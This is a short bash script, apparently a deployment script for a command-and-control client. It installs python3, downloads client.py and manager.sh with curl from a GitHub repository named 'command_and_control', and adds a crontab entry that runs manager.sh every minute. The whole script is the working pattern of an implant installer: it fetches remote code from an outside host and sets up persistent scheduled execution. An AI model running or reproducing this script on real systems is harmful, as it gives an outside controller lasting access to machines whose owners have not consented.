#!/bin/bash
yum install -y python3
curl https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /home/user/client.py
curl https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /home/user/manager.sh
(crontab -l 2>/dev/null; echo "* * * * * /home/user/manager.sh") | crontab -